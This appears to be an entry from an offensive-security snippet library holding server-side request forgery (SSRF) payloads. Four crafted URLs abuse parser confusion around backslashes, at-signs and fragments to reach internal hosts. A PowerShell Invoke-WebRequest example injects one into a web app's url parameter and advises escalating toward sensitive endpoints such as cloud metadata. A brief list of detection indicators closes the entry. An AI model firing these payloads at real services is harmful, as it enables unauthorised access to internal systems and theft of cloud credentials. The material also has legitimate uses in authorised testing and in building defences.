---
id: 84ef1b59-e069-4e6b-ade0-1ae8c3322b26
type: code
name: SSRF-URL-Parser-Bypass-Payloads
language: powershell
verified: true
created_at: '2023-04-06T03:56:37.632109+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssrf
  - payload
  - bypass
validated: true
---

# SSRF-URL-Parser-Bypass-Payloads

## Code

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

## Description

This code snippet provides example URL payloads for bypassing weak URL parsers in SSRF attacks. These strings exploit parsing ambiguities with backslashes (\), at signs (@), colons, and fragments (#) to redirect requests from a decoy IP (e.g., 127.1.1.1) to an internal target (e.g., 127.2.2.2 or cloud metadata). Use in PowerShell for scripting tests or directly in HTTP requests. These are non-executable strings but can be invoked via tools like Invoke-WebRequest for automated testing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $DECOY_IP | Decoy IP to start the URL (avoids direct localhost blocks) | 127.1.1.1 |
| $DECOY_PORT | Port for the decoy (common web port) | 80 |
| $TARGET_IP | Internal IP to redirect to (e.g., localhost or 169.254.169.254) | 127.2.2.2 |
| $TARGET_PORT | Port for the internal service | 80 |

## Usage

Substitute parameters into the payloads and inject via HTTP requests in procedures like [[procedures/SSRF-Exploiting-URL-Parser-Bypass]]. For example, in PowerShell: $payload = "http://$DECOY_IP`:$DECOY_PORT\@$TARGET_IP`:$TARGET_PORT/"; Invoke-WebRequest -Uri "http://target.com/endpoint?url=$payload". Ideal for testing against web apps with URL-fetching features; start with benign internals and escalate to sensitive endpoints.

## Detection

- Application logs showing malformed URLs with unusual characters (@, \, # in paths).
- Network monitoring for requests to internal IPs from public-facing services.
- WAF alerts on URL patterns matching SSRF bypass signatures (e.g., IP octet tricks).
- Increased traffic to metadata endpoints or localhost from app servers.

## Related

- [[procedures/SSRF-Exploiting-URL-Parser-Bypass]]
- [[curl-ssrf-payload-test]]
